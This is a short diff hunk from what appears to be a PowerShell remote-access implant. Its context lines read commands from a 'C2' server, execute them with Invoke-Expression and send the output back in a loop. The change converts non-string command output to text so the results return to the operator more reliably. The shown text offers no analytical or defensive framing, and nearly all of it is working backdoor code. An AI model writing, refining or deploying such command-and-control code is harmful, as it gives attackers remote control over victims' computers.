@@ -79,6 +79,9 @@ while($true){
     # Get commands from the C2, run them and send the output back
     $command = $reader.ReadLine()
     $reply = Invoke-Expression $command
+    if($reply.GetType().Name -ne "String"){
+        $reply = $reply | Out-String
+    }
     $writer.WriteLine($reply)
     $I++;
 }
